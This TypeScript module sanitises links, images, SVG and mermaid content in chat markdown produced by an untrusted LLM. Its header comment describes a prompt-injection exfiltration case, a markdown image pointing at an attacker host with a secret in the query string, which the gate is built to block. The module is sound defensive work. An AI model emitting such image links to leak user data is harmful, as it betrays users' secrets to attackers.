/**
 * Link and image policy for chat markdown (untrusted LLM output).
 *
 * Owner decision: links render as real <a>; external ones open in a new tab
 * with rel="noopener noreferrer nofollow". Images auto-load only from the same
 * origin, `data:image/` and `blob:`. Any other image becomes a click-to-load
 * placeholder that names its host, so a prompt-injected
 * `![](https://attacker/?q=<secret>)` cannot exfiltrate data by merely
 * rendering.
 *
 * The image gate is a rehype plugin that runs after rehype-sanitize, so it
 * holds no matter which `img` component a caller passes.
 */
import type { Element, ElementContent, Root, RootContent } from 'hast'

/** Placeholder element the gate emits instead of a blocked <img>. */
export const IMAGE_GATE_TAG = 'aiui-image-gate'

const DUMMY_BASE = 'http://aiui.invalid/'

function currentBase(): string {
    return typeof location !== 'undefined' && location.href ? location.href : DUMMY_BASE
}

/** Parse `href` against the page; null when it is not a URL at all. */
function parse(href: string): URL | null {
    try {
        return new URL(href, currentBase())
    } catch {
        return null
    }
}

/** Streamdown's own placeholders (`streamdown:incomplete-link`, `streamdown:incomplete-image`). */
export function isStreamdownPlaceholder(src: string): boolean {
    return /^streamdown:/i.test(src.trim())
}

/** May this image load without a click? */
export function isAutoLoadImage(src: unknown): boolean {
    if (typeof src !== 'string' || !src.trim()) return false
    const s = src.trim()
    if (/^data:image\//i.test(s)) return true
    if (/^blob:/i.test(s)) return true
    if (isStreamdownPlaceholder(s)) return true // renders a skeleton, never fetches
    const url = parse(s)
    if (!url || (url.protocol !== 'http:' && url.protocol !== 'https:')) return false
    return url.origin === new URL(currentBase()).origin
}

/** Host shown on the placeholder ("evil.example"), or null for non-http(s) sources. */
export function imageHost(src: unknown): string | null {
    if (typeof src !== 'string') return null
    const url = parse(src.trim())
    return url && (url.protocol === 'http:' || url.protocol === 'https:') ? url.host : null
}

/** Should this link open in a new tab (anything not on this origin, incl. mailto:)? */
export function isExternalHref(href: string): boolean {
    const h = href.trim()
    if (!h || h.startsWith('#')) return false
    const url = parse(h)
    if (!url) return false
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return true
    return url.origin !== new URL(currentBase()).origin
}

export const EXTERNAL_LINK_REL = 'noopener noreferrer nofollow'

/** A resource reference inside rendered SVG that may load: #fragment, data:image/, blob: or same origin. */
function isSafeSvgResource(ref: string): boolean {
    const r = ref.trim()
    if (r.startsWith('#')) return true
    return !isStreamdownPlaceholder(r) && isAutoLoadImage(r)
}

const CSS_URL = /url\(\s*(['"]?)(.*?)\1\s*\)/gi

function gateCss(css: string): string {
    return css
        .replace(/@import[^;]*;?/gi, '')
        .replace(CSS_URL, (whole, _q: string, ref: string) => (isSafeSvgResource(ref) ? whole : 'none'))
}

const IMG_KEY = /(\bimg\s*:\s*)(['"])(.*?)\2/gi
/** 1×1 transparent GIF: mermaid needs a decodable image to lay out an image shape. */
const BLANK_IMAGE = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'

/**
 * Mermaid source text from an untrusted author: off-origin `url(...)` (classDef,
 * style, themeCSS) becomes `none`, `@import` is dropped, and image-shape
 * sources (`img: "https://..."`) that may not auto-load become a blank image.
 */
export function gateMermaidSource(source: string): string {
    return gateCss(source).replace(IMG_KEY, (whole, key: string, q: string, ref: string) =>
        isSafeSvgResource(ref) ? whole : `${key}${q}${BLANK_IMAGE}${q}`,
    )
}

/** Elements that fetch on their own; only images with a safe source survive. */
const FETCHING = 'img, image, feImage, picture, source, video, audio, iframe, object, embed, link, use, script'

/**
 * Strip everything in a rendered SVG (e.g. a mermaid diagram) that would load
 * a resource from another origin: <img>/<image>/<use>/<feImage> with an
 * off-origin source, srcset, media and embed elements, and `url(...)` or
 * `@import` in style attributes and <style>. Parsing happens in an inert
 * DOMParser document, which never fetches.
 */
export function gateSvgResources(svg: string): string {
    if (typeof DOMParser === 'undefined') return svg
    const doc = new DOMParser().parseFromString(`<!doctype html><html><body>${svg}</body></html>`, 'text/html')
    const root = doc.body
    for (const el of Array.from(root.querySelectorAll(FETCHING))) {
        const tag = el.localName.toLowerCase()
        const ref = el.getAttribute('src') ?? el.getAttribute('href') ?? el.getAttribute('xlink:href') ?? ''
        const imageLike = tag === 'img' || tag === 'image' || tag === 'feimage' || tag === 'use'
        if (imageLike && ref && isSafeSvgResource(ref) && !el.hasAttribute('srcset')) continue
        el.remove()
    }
    for (const el of Array.from(root.querySelectorAll('[background], [poster], [srcset]'))) {
        el.removeAttribute('background')
        el.removeAttribute('poster')
        el.removeAttribute('srcset')
    }
    for (const el of Array.from(root.querySelectorAll<HTMLElement>('[style]'))) {
        el.setAttribute('style', gateCss(el.getAttribute('style') ?? ''))
    }
    for (const el of Array.from(root.querySelectorAll('style'))) {
        el.textContent = gateCss(el.textContent ?? '')
    }
    return root.innerHTML
}

function gateChildren(children: (RootContent | ElementContent)[]): void {
    for (let i = 0; i < children.length; i++) {
        const node = children[i]
        if (node.type !== 'element') continue
        if (node.tagName === 'source') {
            // <picture><source srcset> fetches on its own; the <img> fallback goes through the gate.
            children.splice(i, 1)
            i--
            continue
        }
        if (node.tagName === 'img' && !isAutoLoadImage(node.properties?.src)) {
            const gated: Element = {
                type: 'element',
                tagName: IMAGE_GATE_TAG,
                properties: {
                    dataAiuiSrc: typeof node.properties?.src === 'string' ? node.properties.src : '',
                    dataAiuiAlt: typeof node.properties?.alt === 'string' ? node.properties.alt : '',
                },
                children: [],
            }
            children[i] = gated
            continue
        }
        if (node.tagName === 'img') {
            // Allowed image: drop anything that could fetch another resource.
            delete node.properties.srcSet
            delete node.properties.longDesc
        }
        gateChildren(node.children)
    }
}

/** rehype plugin: gate images per the policy above (chat variant only). */
export function rehypeImageGate() {
    return (tree: Root) => {
        gateChildren(tree.children)
    }
}
